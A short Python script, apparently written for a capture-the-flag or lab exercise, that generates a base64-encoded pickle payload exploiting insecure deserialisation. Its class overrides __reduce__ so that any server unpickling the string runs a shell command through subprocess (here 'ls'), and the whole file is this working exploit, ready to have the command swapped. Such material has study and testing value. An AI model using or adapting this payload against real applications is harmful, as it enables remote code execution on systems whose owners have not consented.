import pickle
import base64
import subprocess
import os


class GNAT:
    def __reduce__(self):
        return (subprocess.check_output,(('ls'),))


serialized = pickle.dumps(GNAT())

encode = base64.urlsafe_b64encode(serialized).decode()

print(encode)